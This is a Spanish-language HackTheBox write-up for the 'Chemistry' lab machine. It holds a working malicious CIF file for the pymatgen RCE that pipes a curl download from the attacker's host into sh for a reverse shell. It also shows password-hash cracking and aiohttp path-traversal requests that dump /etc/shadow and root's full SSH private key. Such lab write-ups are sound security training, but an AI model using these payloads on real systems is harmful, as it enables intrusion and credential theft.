---
title: "Máquina Chemistry"
description: "Resolución de la máquina Chemistry de HackTheBox"
tags: ["CVE-2024-23346", "CVE-2024-23334"]
categories: ["HackTheBox", "Easy", "Linux"]
logo: "/assets/writeups/chemistry/logo.webp"
---

En esta máquina abusaremos de un procesador de formulas cristalinas para obtener acceso a la máquina. Luego estando en la máquina escalaremos privilegios abusando de un servicio interno.

## Reconocimiento

La máquina tiene 2 puertos abiertos:

```bash
# Nmap 7.95 scan initiated Sat Oct 19 15:03:43 2024 as: nmap -sS -Pn -p- --open -oN ports --min-rate 300 -vvv -n 10.10.11.38
Nmap scan report for 10.10.11.38
Host is up, received user-set (0.37s latency).
Scanned at 2024-10-19 15:03:43 -04 for 164s
Not shown: 59811 closed tcp ports (reset), 5722 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Oct 19 15:06:27 2024 -- 1 IP address (1 host up) scanned in 164.12 seconds
```

El puerto 5000 nos muestra una página peculiar:

![Webpage](/assets/writeups/chemistry/1.png)

Al registrarnos, nos da una ventana nueva para subir un archivo de tipo `CIF` junto con una muestra:

![CIF](/assets/writeups/chemistry/2.png)

"CIF" hace referencia a "Crystallographic Information File", un formato de archivo para almacenar información cristalográfica sobre moléculas cristalinas.

A ver que encontramos.

## Intrusión

### app - chemistry 

El 404 de esta web nos recuerda al típico de Flask:

![404](/assets/writeups/chemistry/3.png)

Si buscamos en internet por librerías de Python que procesen los archivo de tipo CIF, encontraremos una que lleva de nombre "pymatgen", la cual tuvo [un RCE](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) que ahora mismo tiene un PoC público.

Sabiendo que esto utiliza Python, existe probabilidad de que este procesador de archivos CIF esté siendo utilizado, asi que vamos a crearnos un archivo CIF para mandarnos una reverse shell:

```python
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "uwu"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl http://10.10.16.38:8000/uwu | sh");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Al subirlo y dejar en escucha un netcat junto a un servidor HTTP en el puerto 8000 hospedando el archivo `uwu` con un comando para ejecutar una reverse shell, veremos que:

```bash
❯ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.38 - - [08/Mar/2025 08:36:58] "GET /uwu HTTP/1.1" 200 -
```

```bash
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.38 45410
bash: cannot set terminal process group (1078): Inappropriate ioctl for device
bash: no job control in this shell
app@chemistry:~$ script /dev/null -c bash # Inicia un nuevo proceso
script /dev/null -c bash
Script started, file is /dev/null
app@chemistry:~$ ^Z # CTRL + Z
[1]  + 6206 suspended  nc -lvnp 443

❯ stty raw -echo; fg
[1]  + 6206 continued  nc -lvnp 443
                                   reset xterm # Reiniciar terminal
app@chemistry:~$ export TERM=xterm-256color # Establecer tipo específico de terminal
app@chemistry:~$ stty rows 34 columns 149 # Establecer filas y columnas
app@chemistry:~$ source /etc/skel/.bashrc # ¡Colores!
```

### rosa - chemistry

En la carpeta `instance`, hay una base de datos. Es la que utiliza la aplicación:

```bash
app@chemistry:~/instance$ ls -la
total 28
drwx------ 2 app app  4096 Mar  8 12:37 .
drwxr-xr-x 9 app app  4096 Mar  8 02:39 ..
-rwx------ 1 app app 20480 Mar  8 12:37 database.db
-rw-r--r-- 1 app app     0 Mar  8 11:32 database.sb
app@chemistry:~/instance$ file database.db
database.db: SQLite 3.x database, last written using SQLite version 3031001
```

Al ver los usuarios, encontraremos un hash de una usuaria del sistema:

```bash
sqlite> select username,password from user;
admin|2861debaf8d99436a10ed6f75a252abf
app|197865e46b878d9e74a0346b6d59886a
rosa|63ed86ee9f624c7b14f1d4f43dc251a5
```

Los primeros dos no parecen ser crackeables, pero el último:

```bash
❯ hashcat -m 0 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --show
63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
```

Esta contraseña es reutilizada:

```bash
app@chemistry:~/instance$ su rosa
Password: 
rosa@chemistry:/home/app/instance$
```

En su carpeta personal encontraremos la primera flag.

```bash
rosa@chemistry:~$ ls -la
total 36
drwxr-xr-x 5 rosa rosa 4096 Jun 17  2024 .
drwxr-xr-x 4 root root 4096 Jun 16  2024 ..
lrwxrwxrwx 1 root root    9 Jun 17  2024 .bash_history -> /dev/null
-rw-r--r-- 1 rosa rosa  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 rosa rosa 3771 Feb 25  2020 .bashrc
drwx------ 2 rosa rosa 4096 Jun 15  2024 .cache
drwxrwxr-x 4 rosa rosa 4096 Jun 16  2024 .local
-rw-r--r-- 1 rosa rosa  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root    9 Jun 17  2024 .sqlite_history -> /dev/null
drwx------ 2 rosa rosa 4096 Jun 15  2024 .ssh
-rwxr-xr-x 1 rosa rosa    0 Jun 15  2024 .sudo_as_admin_successful
-rw-r----- 1 root rosa   33 Mar  8 01:18 user.txt
rosa@chemistry:~$ cat user.txt 
e83b50fa3f8b926df9ee53e20f******
```

## Escalada de privilegios

Hay un servicio interno en la máquina escuchando en el puerto http-alt u 8080:

```bash
rosa@chemistry:~$ ss -ltu
Netid         State          Recv-Q         Send-Q                 Local Address:Port                      Peer Address:Port         Process         
udp           UNCONN         0              0                      127.0.0.53%lo:domain                         0.0.0.0:*                            
udp           UNCONN         0              0                            0.0.0.0:bootpc                         0.0.0.0:*                            
tcp           LISTEN         0              128                          0.0.0.0:5000                           0.0.0.0:*                            
tcp           LISTEN         0              128                        127.0.0.1:http-alt                       0.0.0.0:*                            
tcp           LISTEN         0              4096                   127.0.0.53%lo:domain                         0.0.0.0:*                            
tcp           LISTEN         0              128                          0.0.0.0:ssh                            0.0.0.0:*                            
tcp           LISTEN         0              128                             [::]:ssh                               [::]:*   
```

Si le hacemos un curl, veremos algo de información:

```bash
rosa@chemistry:~$ curl -v http://127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 5971
< Date: Sat, 08 Mar 2025 12:59:45 GMT
< Server: Python/3.9 aiohttp/3.9.1
< 
<!DOCTYPE html>
<html lang="en">
... [snip]
```

Por el contenido HTML podemos inferir que se trata de un sitio web de monitoreo, pero no parece tener funcionalidad alguna. Como si fuese una plantilla nomás.

Buscando información de `aiohttp` (que nos sale en la cabecera Server), encontraremos una vulnerabilidad que afecta a la versión que se ve. Catalogada como `CVE-2024-23334`:

> *When using aiohttp as a web server and configuring static routes, it is necessary to specify the root path for static files. Additionally, the option 'follow_symlinks' can be used to determine whether to follow symbolic links outside the static root directory. When 'follow_symlinks' is set to True, there is no validation to check if reading a file is within the root directory. This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system, even when symlinks are not present*

Esto significa que si le mandamos una petición con secuencias de navegación de directorios (`../`) a la ruta `/assets` podemos ir hacia atrás en el árbol y listar archivos que no deberiamos poder ver.

Si vemos quien corre este proceso, veremos que es root:

```bash
rosa@chemistry:~$ ps -faux
... [snip]
root        1079  0.2  1.8 340352 37736 ?        Ssl  01:10   2:05 /usr/bin/python3.9 /opt/monitoring_site/app.py
root        1085  0.0  0.1   6816  3064 ?        Ss   01:10   0:00 /usr/sbin/cron -f
... [snip]
```

Si intentamos listar el `/etc/shadow`, pues...

```bash
rosa@chemistry:~$ curl -v --path-as-is http://127.0.0.1:8080/assets/../../../etc/shadow
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /assets/../../../etc/shadow HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Type: application/octet-stream
< Etag: "17fd638c3d6090a6-53f"
< Last-Modified: Fri, 11 Oct 2024 11:48:06 GMT
< Content-Length: 1343
< Accept-Ranges: bytes
< Date: Sat, 08 Mar 2025 13:08:18 GMT
< Server: Python/3.9 aiohttp/3.9.1
< 
root:$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.:19891:0:99999:7:::
daemon:*:19430:0:99999:7:::
bin:*:19430:0:99999:7:::
sys:*:19430:0:99999:7:::
sync:*:19430:0:99999:7:::
games:*:19430:0:99999:7:::
man:*:19430:0:99999:7:::
lp:*:19430:0:99999:7:::
mail:*:19430:0:99999:7:::
news:*:19430:0:99999:7:::
uucp:*:19430:0:99999:7:::
proxy:*:19430:0:99999:7:::
www-data:*:19430:0:99999:7:::
backup:*:19430:0:99999:7:::
list:*:19430:0:99999:7:::
irc:*:19430:0:99999:7:::
gnats:*:19430:0:99999:7:::
nobody:*:19430:0:99999:7:::
systemd-network:*:19430:0:99999:7:::
systemd-resolve:*:19430:0:99999:7:::
systemd-timesync:*:19430:0:99999:7:::
messagebus:*:19430:0:99999:7:::
syslog:*:19430:0:99999:7:::
_apt:*:19430:0:99999:7:::
tss:*:19430:0:99999:7:::
uuidd:*:19430:0:99999:7:::
tcpdump:*:19430:0:99999:7:::
landscape:*:19430:0:99999:7:::
pollinate:*:19430:0:99999:7:::
fwupd-refresh:*:19430:0:99999:7:::
usbmux:*:19889:0:99999:7:::
sshd:*:19889:0:99999:7:::
systemd-coredump:!!:19889::::::
rosa:$6$giyD4I2YumzG4k6.$0h0Gtrjj13qoK6m0XevedDBanbEz6BStzsLwUtrDm5sVkmnHOSSWF8f6W8B9btTEzyskmA2h/7F7gyvX1fzrT0:19893:0:99999:7:::
lxd:!:19889::::::
app:$6$XUL17hADm4qICsPv$QvCHMOImUTmS1jiaTQ2t6ZJtDAzgkqRhFYOMd0nty3lLwpyxTiyMWRgO/jbySPENinpJlL0z3MK1OVEaG44sQ1:19890:0:99999:7:::
_laurel:!:20007::::::
* Connection #0 to host 127.0.0.1 left intact
```

Lo mismo con `/root/.ssh/id_rsa`:

```bash
rosa@chemistry:~$ curl -v --path-as-is http://127.0.0.1:8080/assets/../../../root/.ssh/id_rsa
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /assets/../../../root/.ssh/id_rsa HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Type: application/octet-stream
< Etag: "17d9a4c79c30680c-a2a"
< Last-Modified: Mon, 17 Jun 2024 00:58:31 GMT
< Content-Length: 2602
< Accept-Ranges: bytes
< Date: Sat, 08 Mar 2025 13:09:13 GMT
< Server: Python/3.9 aiohttp/3.9.1
< 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
* Connection #0 to host 127.0.0.1 left intact
```

Podemos utilizar esta llave para entrar al sistema como root y tomar la última flag.

```bash
❯ /usr/bin/ssh -i root.rsa root@10.10.11.38
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 08 Mar 2025 01:10:05 PM UTC

  System load:           0.0
  Usage of /:            74.0% of 5.08GB
  Memory usage:          37%
  Swap usage:            0%
  Processes:             254
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.38
  IPv6 address for eth0: dead:beef::250:56ff:feb0:6881

... [snip]

Last login: Sat Mar  8 03:18:25 2025 from 10.10.16.2
root@chemistry:~# ls -la
total 36
drwx------  5 root root 4096 Mar  8 01:18 .
drwxr-xr-x 19 root root 4096 Oct 11 11:17 ..
lrwxrwxrwx  1 root root    9 Jun 17  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Oct  9 16:30 .cache
drwxr-xr-x  3 root root 4096 Jun 15  2024 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 Mar  8 01:18 root.txt
-rw-r--r--  1 root root   66 Jun 18  2024 .selected_editor
lrwxrwxrwx  1 root root    9 Jun 17  2024 .sqlite_history -> /dev/null
drwx------  2 root root 4096 Jun 19  2024 .ssh
root@chemistry:~# cat root.txt
01c6f5b1cbb6684b6b1022bf2a******
```